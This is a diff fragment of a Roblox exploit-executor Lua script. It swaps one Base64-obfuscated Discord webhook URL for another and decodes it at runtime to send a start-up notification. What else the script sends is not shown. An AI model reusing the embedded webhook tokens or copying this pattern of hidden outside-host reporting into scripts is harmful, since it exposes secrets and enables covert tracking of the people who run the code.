@@ -7,7 +7,7 @@ local LocalPlayer = Players.LocalPlayer
 local requestFunc = http_request or request or (syn and syn.request)
 
 -- 👇 ใส่ Webhook ของคุณแบบ Base64
-local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NzI2NDM5MDIxMDQ1MzUyNi91bG4yWTZRbEc1d05uZFBWc2NkTjhoQWFWMzdXdVJYTllUQ05BTlM4ZFdnNHVIVGlOU2VnY3NKeGFVZFY2Rm5nNjk="
+local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjY5ODY1MTA2NzAyNzU5Ny9fdlRXSjVZZjdxZW52OTlnTlZON1RySkVfbmc1WE85TndEYUJnS1U1ZmdRWW0tQ21ZN0pPdjctMWtFMGlPTzdGWTlTaw=="
 local webhookUrl = HttpService:Base64Decode(encodedWebhook)
 
 -- 🔔 แจ้งเตือนเมื่อสคริปต์เริ่ม
